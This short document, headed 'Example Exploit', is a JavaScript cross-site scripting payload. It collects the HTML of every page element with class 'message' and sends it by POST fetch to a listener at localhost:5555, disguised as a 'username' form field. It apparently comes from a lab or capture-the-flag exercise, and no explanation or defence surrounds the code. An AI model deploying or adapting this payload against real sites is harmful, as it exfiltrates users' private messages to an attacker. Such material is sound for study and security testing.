Example Exploit:
function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:5555/', {method: 'POST', body:'username=' + getText(),headers: {      'Content-Type': 'application/x-www-form-urlencoded',     },}); 
